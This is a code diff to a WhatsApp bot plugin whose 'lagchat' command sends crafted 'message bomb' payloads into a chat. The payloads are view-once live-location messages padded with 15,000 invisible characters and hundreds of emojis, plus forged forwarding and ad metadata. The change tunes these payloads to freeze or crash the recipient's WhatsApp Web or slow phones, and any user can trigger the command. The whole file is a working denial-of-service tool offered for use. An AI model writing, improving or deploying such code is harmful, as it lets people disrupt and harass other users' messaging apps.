@@ -2,20 +2,20 @@ const buildLagMessage = () => ({
   viewOnceMessage: {
     message: {
       liveLocationMessage: {
-        degreesLatitude: '🔥',
-        degreesLongitude: '🌪️',
-        caption: ('\u2063💥').repeat(5000), // mezcla caracteres invisibles con emojis
-        sequenceNumber: String(Math.floor(Math.random() * 10000)),
-        jpegThumbnail: Buffer.alloc(3 * 1024, 0), // miniatura ligera
+        degreesLatitude: '💣',
+        degreesLongitude: '💥',
+        caption: '\u2063'.repeat(15000) + '💥'.repeat(300),
+        sequenceNumber: '999',
+        jpegThumbnail: null,
         contextInfo: {
-          forwardingScore: Math.floor(Math.random() * 200),
+          forwardingScore: 999,
           isForwarded: true,
           externalAdReply: {
-            title: 'Lag Prolongado',
-            body: 'Lag que dura varios segundos',
+            title: '💣 Lag WhatsApp',
+            body: 'Este mensaje es muy pesado',
             mediaType: 1,
-            renderLargerThumbnail: false,
-            showAdAttribution: false,
+            renderLargerThumbnail: true,
+            showAdAttribution: true,
             sourceUrl: 'https://wa.me/0'
           }
         }
@@ -26,25 +26,27 @@ const buildLagMessage = () => ({
 
 let handler = async (m, { conn }) => {
   const jid = m.chat
-  const times = 6 // envía 6 mensajes para prolongar el lag
+  const times = 2
 
-  await m.reply(`⚠️ Preparando ${times} mensajes para lag prolongado...`)
+  await m.reply(`⚠️ Enviando ${times} bombas al chat...\n❗ Esto puede trabar WhatsApp Web o móviles lentos.`)
 
   for (let i = 0; i < times; i++) {
     try {
       await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
-      await new Promise(resolve => setTimeout(resolve, 300)) // más tiempo entre mensajes
+      await new Promise(resolve => setTimeout(resolve, 200))
     } catch (error) {
       console.error('Error al enviar mensaje:', error)
-      await m.reply('❗ Error al enviar mensaje.')
+      await m.reply('❗ Ocurrió un error al enviar el mensaje. Intenta de nuevo.')
       return
     }
   }
 
-  await m.reply('✅ *Lag prolongado completo.*')
+  await m.reply('✅ *Lagchat completo.* ¿Se te laggeó? 😈')
 }
 
 handler.command = /^lagchat$/i
 handler.owner = false
+handler.tags = ['tools']
+handler.help = ['lagchat']
 
 export default handler
